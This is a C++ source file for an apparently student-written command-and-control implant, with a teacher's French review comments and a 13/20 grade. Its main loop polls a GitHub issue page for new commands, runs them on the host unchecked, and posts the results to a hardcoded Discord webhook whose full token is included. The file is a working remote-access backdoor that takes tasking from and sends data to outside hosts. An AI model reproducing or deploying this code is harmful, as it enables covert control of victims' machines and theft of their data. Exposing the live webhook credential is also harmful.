#include "include/httpRequest.hpp"
#include "include/fileManager.hpp"
#include "include/htmlParser.hpp"
#include "include/cmd.hpp"
#include "include/execCmd.hpp"
#include <iostream>
#include <chrono>
#include <thread>
#include <string> 
#include <vector>  

int main() {
    HttpRequest httpRequest;
    
    std::string url = "https://github.com/Momollax/git-C2-server/issues/2";
    std::string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
    auto const webhook_url = "https://discord.com/api/webhooks/1217493774268370984/zbWhTADsVXMMtXVTvzrdCtt5_cB3Zncs04zS_EWHYmJv40e3gfWhZvoq0CAhddaJ0VjM";
    // Clarifie le code et évite de recréer la string à chaque boucle.

    Cmd cmd;
    HtmlParser htmlParser(cmd);
    ExecCmd execCmd("");  
    std::size_t previousMatchCount = 0; 
    const std::string& lastContent = cmd.getLastContent();
    // lastContent n'est jamais mis à jour? Le fait de créer une
    // référence &lastContent est un peu trompeur pour le lecteur.
    // Effectivement &lastContent est mis à jour quand l'objet qu'il
    // référence l'est, mais pourquoi ne pas directement utiliser
    // cmd.getLastContent() ?
    while (true) {
        std::string response = httpRequest.get(url, userAgent);
        std::string extractedContent = htmlParser.extractContent(response);
        // On ne s'attend pas forcément à ce que la mise à jour de cmd
        // soit dans la fonction HtmlParser::extractContent alors que c'est
        // un élément clé pour comprendre que lastContent est mis à jour.

        auto hasChanges = cmd.addContentIfChanged(extractedContent);
        auto isNewCommand = (htmlParser.getcmd_number() != previousMatchCount);
        // Un attribut isDone sur la classe Cmd aurait peut être été plus pratique.

        if (hasChanges and isNewCommand) {
            const std::vector<std::string>& allContent = cmd.getAllContent();
            ExecCmd execCmd(lastContent);
            // ExecCmd execCmd(cmd.getLastContent()) est peut être plus simple à suivre.
            std::string commandResult = execCmd.executeCommand();
            //std::cout << commandResult << std::endl;
            previousMatchCount = htmlParser.getcmd_number();
            execCmd.sendToDiscordWebhook(webhook_url, commandResult);
        }
        std::this_thread::sleep_for(std::chrono::seconds(10));
    }

    return 0;
}


// D'une manière générale, prennez le temps de réfléchir à votre approche sur le problème avant de coder.
// Prennez le temps de comprendre le code que vous utiliser.
// Votre projet aborde en effet des aspects complexes qui vous ont obligés à trouver des "astuces" parfois maladroites (std:sleep)
// Je vous avoue que l'idée d'executer du code venant de l'exterieur sans aucune validation peut en faire bondir plus d'un.

// Une fois que vous choisissez une facon de nommer les variables, mettez vous d'accord et gardez cette notation
// ici on a executeCommand d'un côté et getcmd_number de l'autre.

// Le code reste relativement clair et je ne peux que vous encourager a continuer d'experimenter via des projets qui vous inspirent.

// 13/20
